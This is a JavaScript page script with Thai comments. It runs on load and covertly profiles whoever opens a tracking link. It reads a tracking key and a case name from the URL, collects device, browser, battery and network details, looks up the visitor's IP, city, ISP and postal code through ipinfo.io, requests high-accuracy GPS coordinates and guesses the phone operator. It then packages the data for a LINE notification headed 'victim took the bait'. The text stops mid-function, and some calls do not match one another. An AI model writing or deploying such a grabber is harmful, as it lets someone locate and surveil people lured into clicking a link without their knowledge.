// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}


function detectiPadModel() {
  // ถ้าไม่ใช่ iPad ให้คืนค่า null
  if (!/iPad/i.test(navigator.userAgent)) {
    return null;
  }

  // ข้อมูลหน้าจอ
  const width = window.screen.width;
  const height = window.screen.height;
  const pixelRatio = window.devicePixelRatio || 1;
  const maxDimension = Math.max(width, height);
  const minDimension = Math.min(width, height);
  
  // ดึงข้อมูลของ iOS เวอร์ชั่น
  const iosVersionMatch = navigator.userAgent.match(/OS (\d+)_(\d+)(?:_(\d+))?/i);
  const iosVersion = iosVersionMatch 
    ? `${iosVersionMatch[1]}.${iosVersionMatch[2]}${iosVersionMatch[3] ? `.${iosVersionMatch[3]}` : ''}`
    : "ไม่ทราบ";
  
  // ตรวจสอบแบบละเอียด
  let model = "iPad";
  let generation = "ไม่ทราบรุ่น";
  
  // iPad Pro 12.9"
  if (maxDimension >= 2732 && pixelRatio >= 2) {
    model = "iPad Pro 12.9 นิ้ว";
    if (navigator.userAgent.includes("CPU OS 15") || navigator.userAgent.includes("CPU OS 16")) {
      generation = "รุ่นที่ 5 หรือ 6";
    } else if (navigator.userAgent.includes("CPU OS 13") || navigator.userAgent.includes("CPU OS 14")) {
      generation = "รุ่นที่ 4";
    } else if (navigator.userAgent.includes("CPU OS 12")) {
      generation = "รุ่นที่ 3";
    } else if (navigator.userAgent.includes("CPU OS 10") || navigator.userAgent.includes("CPU OS 11")) {
      generation = "รุ่นที่ 2";
    } else {
      generation = "รุ่นที่ 1";
    }
  } 
  // iPad Pro 11"
  else if (maxDimension >= 2388 && pixelRatio >= 2) {
    model = "iPad Pro 11 นิ้ว";
    if (navigator.userAgent.includes("CPU OS 15") || navigator.userAgent.includes("CPU OS 16")) {
      generation = "รุ่นที่ 3 หรือ 4";
    } else if (navigator.userAgent.includes("CPU OS 13") || navigator.userAgent.includes("CPU OS 14")) {
      generation = "รุ่นที่ 2";
    } else {
      generation = "รุ่นที่ 1";
    }
  }
  // iPad Air 10.9"
  else if (maxDimension >= 2360 && pixelRatio >= 2) {
    model = "iPad Air 10.9 นิ้ว";
    if (navigator.userAgent.includes("CPU OS 15") || navigator.userAgent.includes("CPU OS 16")) {
      generation = "รุ่นที่ 5";
    } else {
      generation = "รุ่นที่ 4";
    }
  }
  // iPad Pro 10.5"
  else if (maxDimension >= 2224 && pixelRatio >= 2) {
    model = "iPad Pro 10.5 นิ้ว";
  }
  // iPad 10.2" (7th gen and later)
  else if (maxDimension >= 2160 && pixelRatio >= 2) {
    model = "iPad 10.2 นิ้ว";
    if (navigator.userAgent.includes("CPU OS 16")) {
      generation = "รุ่นที่ 10";
    } else if (navigator.userAgent.includes("CPU OS 15")) {
      generation = "รุ่นที่ 9";
    } else if (navigator.userAgent.includes("CPU OS 14")) {
      generation = "รุ่นที่ 8";
    } else {
      generation = "รุ่นที่ 7";
    }
  }
  // iPad 9.7" Retina
  else if (maxDimension >= 2048 && pixelRatio >= 2) {
    if (navigator.userAgent.includes("CPU OS 12") || navigator.userAgent.includes("CPU OS 13")) {
      model = "iPad 9.7 นิ้ว";
      generation = "รุ่นที่ 6";
    } else if (navigator.userAgent.includes("CPU OS 10") || navigator.userAgent.includes("CPU OS 11")) {
      model = "iPad 9.7 นิ้ว";
      generation = "รุ่นที่ 5";
    } else if (navigator.userAgent.includes("CPU OS 9")) {
      model = "iPad Pro 9.7 นิ้ว";
    } else {
      model = "iPad Air/iPad 4";
    }
  }
  // iPad Mini Retina
  else if (maxDimension >= 1536 && pixelRatio >= 2) {
    model = "iPad Mini";
    if (navigator.userAgent.includes("CPU OS 15") || navigator.userAgent.includes("CPU OS 16")) {
      generation = "รุ่นที่ 6";
    } else if (navigator.userAgent.includes("CPU OS 14")) {
      generation = "รุ่นที่ 5";
    } else {
      generation = "รุ่นที่ 2-4";
    }
  }
  // iPad 1/2/Mini original
  else {
    if (navigator.userAgent.includes("CPU OS 7") || navigator.userAgent.includes("CPU OS 8") || navigator.userAgent.includes("CPU OS 9")) {
      model = "iPad Mini";
      generation = "รุ่นแรก";
    } else {
      model = "iPad";
      generation = "รุ่นที่ 1 หรือ 2";
    }
  }

  return {
    model: model,
    generation: generation,
    resolution: `${width}x${height}`,
    pixelRatio: pixelRatio,
    screenSize: `${maxDimension}x${minDimension}`,
    iosVersion: iosVersion
  };
}


// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";

  // ตรวจสอบประเภทอุปกรณ์แบบละเอียด
  const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent);
  const isMobile = /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(userAgent);
  
  // กำหนดประเภทอุปกรณ์
  let deviceType = "คอมพิวเตอร์";
  if (isTablet) deviceType = "แท็บเล็ต";
  else if (isMobile) deviceType = "มือถือ";

  // ตรวจสอบระบบปฏิบัติการแบบละเอียด
  let os = "ไม่ทราบ";
  let osVersion = "ไม่ทราบ";
  
  // ตรวจสอบ iOS, iPadOS
  const iosMatch = userAgent.match(/(iPhone|iPad|iPod).*OS\s(\d+)_(\d+)/i);
  if (iosMatch) {
    if (iosMatch[1] === "iPad") {
      os = "iPadOS";
    } else {
      os = "iOS";
    }
    osVersion = `${iosMatch[2]}.${iosMatch[3]}`;
  } 
  // ตรวจสอบ macOS
  else if (userAgent.match(/Mac OS X/i)) {
    os = "macOS";
    const macOSMatch = userAgent.match(/Mac OS X (\d+)[._](\d+)/i);
    if (macOSMatch) {
      osVersion = `${macOSMatch[1]}.${macOSMatch[2]}`;
    } else {
      // สำหรับ macOS Catalina ขึ้นไปที่ใช้ชื่อ 10.15+
      const macOSMatch2 = userAgent.match(/Mac OS X 10[._](\d+)[._]?(\d*)/i);
      if (macOSMatch2) {
        osVersion = `10.${macOSMatch2[1]}${macOSMatch2[2] ? `.${macOSMatch2[2]}` : ''}`;
      }
    }
  } 
  // ตรวจสอบ Android
  else if (userAgent.match(/Android/i)) {
    os = "Android";
    const androidMatch = userAgent.match(/Android\s+([\d.]+)/i);
    if (androidMatch) {
      osVersion = androidMatch[1];
    }
  } 
  // ตรวจสอบ Windows
  else if (userAgent.match(/Windows/i)) {
    os = "Windows";
    if (userAgent.match(/Windows NT 10/i)) {
      osVersion = "10/11"; // Windows 10 และ 11 มี NT 10
    } else if (userAgent.match(/Windows NT 6.3/i)) {
      osVersion = "8.1";
    } else if (userAgent.match(/Windows NT 6.2/i)) {
      osVersion = "8";
    } else if (userAgent.match(/Windows NT 6.1/i)) {
      osVersion = "7";
    } else if (userAgent.match(/Windows NT 6.0/i)) {
      osVersion = "Vista";
    } else if (userAgent.match(/Windows NT 5.1/i)) {
      osVersion = "XP";
    } else {
      const winMatch = userAgent.match(/Windows NT ([\d.]+)/i);
      if (winMatch) {
        osVersion = winMatch[1];
      }
    }
  } 
  // ตรวจสอบ Linux
  else if (userAgent.match(/Linux/i)) {
    os = "Linux";
    if (userAgent.match(/Ubuntu/i)) {
      os = "Ubuntu Linux";
    } else if (userAgent.match(/Fedora/i)) {
      os = "Fedora Linux";
    } else if (userAgent.match(/Debian/i)) {
      os = "Debian Linux";
    }
  } 
  // ตรวจสอบ Chrome OS
  else if (userAgent.match(/CrOS/i)) {
    os = "Chrome OS";
  }

  // ระบุรุ่นอุปกรณ์
  let deviceModel = "ไม่สามารถระบุได้";

  // ตรวจสอบรุ่นของ iPhone/iPad แบบละเอียด
  if (iosMatch) {
    if (iosMatch[1] === "iPad") {
      // ใช้ฟังก์ชันพิเศษสำหรับตรวจจับรุ่น iPad
      const iPadDetails = detectiPadModel();
      if (iPadDetails) {
        deviceModel = `${iPadDetails.model} ${iPadDetails.generation} (iPadOS ${osVersion}, ${iPadDetails.resolution})`;
      } else {
        deviceModel = `iPad (iPadOS ${osVersion})`;
      }
    } else if (iosMatch[1] === "iPhone") {
      // รู้ว่าเป็น iPhone แต่ไม่สามารถระบุรุ่นได้แน่ชัดจาก User Agent
      deviceModel = `iPhone (iOS ${osVersion})`;
      
      // ตรวจสอบหน้าจอเพื่อระบุรุ่นโดยประมาณ
      if (window.screen) {
        const width = window.screen.width;
        const height = window.screen.height;
        const maxDim = Math.max(width, height);
        
        if (maxDim >= 2778) {
          deviceModel = `iPhone 14 Pro Max / 13 Pro Max / 12 Pro Max (iOS ${osVersion})`;
        } else if (maxDim >= 2532) {
          deviceModel = `iPhone 14 Pro / 14 / 13 Pro / 13 / 12 Pro / 12 (iOS ${osVersion})`;
        } else if (maxDim >= 2340) {
          deviceModel = `iPhone 14 Plus / 13 Mini / 12 Mini (iOS ${osVersion})`;
        } else if (maxDim >= 1792) {
          deviceModel = `iPhone 11 / XR (iOS ${osVersion})`;
        } else if (maxDim >= 2436) {
          deviceModel = `iPhone 11 Pro / XS / X (iOS ${osVersion})`;
        } else if (maxDim >= 1334) {
          deviceModel = `iPhone 8 / 7 / 6s / 6 (iOS ${osVersion})`;
        } else {
          deviceModel = `iPhone SE / 5s / 5 (iOS ${osVersion})`;
        }
      }
    } else if (iosMatch[1] === "iPod") {
      deviceModel = `iPod Touch (iOS ${osVersion})`;
    }
  } 
  // ตรวจสอบรุ่น Android
  else if (os === "Android") {
    // สกัดข้อมูลเฉพาะส่วนของรุ่นอุปกรณ์จาก User Agent
    const androidModelMatch = userAgent.match(/Android[\s\S]*?;\s*([^;)]+(?:\s*Build|\s*[;)]|$))/i);
    if (androidModelMatch) {
      // ทำความสะอาดข้อมูลเพื่อให้ได้แค่ชื่อรุ่น
      deviceModel = androidModelMatch[1]
        .replace(/Build/i, '').trim()
        .replace(/SAMSUNG|Samsung/i, 'Samsung ')
        .replace(/LGE/i, 'LG ')
        .replace(/Xiaomi|XiaoMi|MI/i, 'Xiaomi ')
        .replace(/HUAWEI/i, 'Huawei ')
        .replace(/OPPO/i, 'OPPO ')
        .replace(/vivo/i, 'Vivo ')
        .replace(/Redmi/i, 'Xiaomi Redmi ')
        .replace(/SM-([A-Z]\d+)/i, 'Samsung $1 ') // แปลงรหัส Samsung
        .replace(/ +/g, ' ') // ลบช่องว่างซ้ำ
        .trim();
    } else {
      deviceModel = `Android ${osVersion}`;
    }
  }
  // ตรวจสอบรุ่น Windows
  else if (os === "Windows") {
    if (userAgent.match(/Windows Phone/i)) {
      deviceModel = `Windows Phone ${osVersion}`;
    } else {
      // อาจจะเป็น PC หรือแท็บเล็ต Windows
      const surfaceMatch = userAgent.match(/Windows NT.*Tablet PC.*Touch/i);
      if (surfaceMatch) {
        deviceModel = `Microsoft Surface (Windows ${osVersion})`;
      } else {
        deviceModel = `Windows ${osVersion} PC`;
      }
    }
  }
  // ตรวจสอบรุ่น Mac
  else if (os === "macOS") {
    const processorMatch = userAgent.match(/Intel|PPC|Apple/i);
    if (processorMatch) {
      const processor = processorMatch[0];
      if (processor === "Apple") {
        deviceModel = `Mac with Apple Silicon (macOS ${osVersion})`;
      } else {
        deviceModel = `Mac with ${processor} (macOS ${osVersion})`;
      }
    } else {
      deviceModel = `Mac (macOS ${osVersion})`;
    }
  }

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    platform: `${os} ${osVersion}`
  };
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้",
    effectiveType: "ไม่สามารถระบุได้",
    downlink: "ไม่สามารถระบุได้",
    rtt: "ไม่สามารถระบุได้",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้"
  };

  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    }
    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
      connectionInfo.isMobile = true;

      // ระบุประเภทเครือข่ายโทรศัพท์
      if (connection.type === '5g') {
        connectionInfo.networkType = "5G";
      } else if (connection.type === '4g' || connection.type === 'lte') {
        connectionInfo.networkType = "4G/LTE";
      } else if (connection.type === '3g' || ['umts', 'hspa', 'evdo'].includes(connection.type)) {
        connectionInfo.networkType = "3G";
      } else if (connection.type === '2g' || ['gsm', 'cdma'].includes(connection.type)) {
        connectionInfo.networkType = "2G";
      } else {
        connectionInfo.networkType = "Mobile Data";
      }
    }
    else {
      // ประมาณการเชื่อมต่อจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
      if (connection.effectiveType === '4g') {
        // ถ้า effectiveType เป็น 4g มักจะเป็น WiFi
        connectionInfo.isWifi = true;
        connectionInfo.networkType = "WiFi (ประมาณการ)";
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.isMobile = true;
        connectionInfo.networkType = `Mobile Data (${connection.effectiveType})`;
      }
    }
  } else {
    // ถ้าไม่สามารถใช้ Connection API ได้ ให้ประมาณการจาก User Agent
    const userAgent = navigator.userAgent.toLowerCase();
    if (
      /\bmobile\b/i.test(userAgent) && 
      !(/\bipad\b/i.test(userAgent)) && 
      !(/\btablet\b/i.test(userAgent))
    ) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "Mobile Data (ประมาณการจาก User Agent)";
    } else if (/\bwifi\b/i.test(userAgent)) {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi (ประมาณการจาก User Agent)";
    } else {
      // ถ้าใช้บนอุปกรณ์ Desktop มักจะใช้การเชื่อมต่อแบบมีสาย
      if (!(/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent))) {
        connectionInfo.networkType = "Wired/WiFi (ประมาณการจาก User Agent)";
      }
    }
  }

  return connectionInfo;
}


// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      const level = Math.floor(battery.level * 100);
      
      // แสดงสถานะแบตเตอรี่แบบละเอียดขึ้น
      let chargingStatus = battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ";
      
      // เพิ่มข้อมูลเวลาในการชาร์จ/คายประจุ (ถ้ามี)
      let timeInfo = "";
      if (battery.charging && battery.chargingTime !== Infinity) {
        const chargingMinutes = Math.floor(battery.chargingTime / 60);
        timeInfo = ` (ชาร์จเต็มใน ${chargingMinutes} นาที)`;
      } else if (!battery.charging && battery.dischargingTime !== Infinity) {
        const dischargingMinutes = Math.floor(battery.dischargingTime / 60);
        timeInfo = ` (แบตเตอรี่จะหมดใน ${dischargingMinutes} นาที)`;
      }
      
      // สีที่แสดงสถานะ
      let statusColor = "";
      if (level <= 20) {
        statusColor = "แดง";
      } else if (level <= 50) {
        statusColor = "ส้ม";
      } else {
        statusColor = "เขียว";
      }
      
      return {
        level: `${level}%`,
        charging: chargingStatus + timeInfo,
        statusColor: statusColor,
        timeRemaining: battery.dischargingTime !== Infinity ? battery.dischargingTime : null,
        timeToCharge: battery.chargingTime !== Infinity ? battery.chargingTime : null
      };
    }

    // ถ้าไม่สามารถใช้ Battery API ได้
    return {
      level: "ไม่สามารถเข้าถึงข้อมูลได้",
      charging: "ไม่ทราบ"
    };
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการดึงข้อมูลแบตเตอรี่:", error);
    return {
      level: "ไม่สามารถเข้าถึงข้อมูลได้",
      charging: "ไม่ทราบ",
      errorMessage: error.message
    };
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";

  // เรียงลำดับการตรวจสอบจากเฉพาะเจาะจงไปหาทั่วไป
  
  // สำหรับ Microsoft Edge ใหม่ (Chromium-based)
  if (userAgent.indexOf("Edg/") > -1) {
    browserName = "Microsoft Edge";
    const edgeMatch = userAgent.match(/Edg\/(\d+(\.\d+)+)/i);
    if (edgeMatch) browserVersion = edgeMatch[1];
  }
  // สำหรับ Microsoft Edge เก่า
  else if (userAgent.indexOf("Edge/") > -1) {
    browserName = "Microsoft Edge Legacy";
    const edgeLegacyMatch = userAgent.match(/Edge\/(\d+(\.\d+)+)/i);
    if (edgeLegacyMatch) browserVersion = edgeLegacyMatch[1];
  }
  // สำหรับ Samsung Browser
  else if (userAgent.indexOf("SamsungBrowser") > -1) {
    browserName = "Samsung Internet";
    const samsungMatch = userAgent.match(/SamsungBrowser\/(\d+(\.\d+)+)/i);
    if (samsungMatch) browserVersion = samsungMatch[1];
  }
  // สำหรับ Opera
  else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
    browserName = "Opera";
    const operaMatch = userAgent.indexOf("OPR") > -1 
                    ? userAgent.match(/OPR\/(\d+(\.\d+)+)/i)
                    : userAgent.match(/Opera\/(\d+(\.\d+)+)/i);
    if (operaMatch) browserVersion = operaMatch[1];
  }
  // สำหรับ Firefox
  else if (userAgent.indexOf("Firefox") > -1) {
    browserName = "Firefox";
    const firefoxMatch = userAgent.match(/Firefox\/(\d+(\.\d+)+)/i);
    if (firefoxMatch) browserVersion = firefoxMatch[1];
  }
  // สำหรับ Brave
  else if (userAgent.indexOf("Chrome") > -1 && navigator.brave) {
    browserName = "Brave";
    const braveMatch = userAgent.match(/Chrome\/(\d+(\.\d+)+)/i);
    if (braveMatch) browserVersion = braveMatch[1];
  }
  // สำหรับ UC Browser
  else if (userAgent.indexOf("UCBrowser") > -1) {
    browserName = "UC Browser";
    const ucMatch = userAgent.match(/UCBrowser\/(\d+(\.\d+)+)/i);
    if (ucMatch) browserVersion = ucMatch[1];
  }
  // สำหรับ Chrome
  else if (userAgent.indexOf("Chrome") > -1) {
    browserName = "Chrome";
    const chromeMatch = userAgent.match(/Chrome\/(\d+(\.\d+)+)/i);
    if (chromeMatch) browserVersion = chromeMatch[1];
  }
  // สำหรับ Safari
  else if (userAgent.indexOf("Safari") > -1) {
    browserName = "Safari";
    const safariMatch = userAgent.match(/Version\/(\d+(\.\d+)+)/i);
    if (safariMatch) browserVersion = safariMatch[1];
  }
  // สำหรับ Internet Explorer
  else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
    browserName = "Internet Explorer";
    const ieMatch = userAgent.match(/(?:MSIE |rv:)(\d+(\.\d+)+)/i);
    if (ieMatch) browserVersion = ieMatch[1];
  }
  // สำหรับเบราว์เซอร์จีนรุ่นใหม่
  else if (userAgent.indexOf("QQBrowser") > -1) {
    browserName = "QQ Browser";
    const qqMatch = userAgent.match(/QQBrowser\/(\d+(\.\d+)+)/i);
    if (qqMatch) browserVersion = qqMatch[1];
  }
  else if (userAgent.indexOf("MiuiBrowser") > -1) {
    browserName = "MIUI Browser";
    const miuiMatch = userAgent.match(/MiuiBrowser\/(\d+(\.\d+)+)/i);
    if (miuiMatch) browserVersion = miuiMatch[1];
  }

  return `${browserName} ${browserVersion}`;
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();

    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
      timezone: ipDetails.timezone || "ไม่ทราบ",
      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
    try {
      const basicResponse = await fetch('https://api.ipify.org?format=json');
      const basicData = await basicResponse.json();
      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
    } catch (fallbackError) {
      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
      return { ip: "ไม่สามารถระบุได้" };
    }
  }
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();

    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipapi.co
    const ispInfo = ipDetails.isp || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.includes(keyword))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Android")) {
      // บนแอนดรอยด์อาจมีชื่อเครือข่ายซ่อนอยู่ใน User-Agent บางรุ่น (แต่ปัจจุบันไม่ค่อยมีแล้ว)
      for (const [operator, keywords] of Object.entries(thaiOperators)) {
        if (keywords.some(keyword => userAgent.includes(keyword))) {
          phoneInfo.mobileOperator = operator;
          break;
        }
      }
    }

    // ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country;

      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
      if (ipDetails.country === "Thailand" || ipDetails.country === "TH") {
        phoneInfo.countryCode = "+66";
      }
    }

    // ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : "");
    }

    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
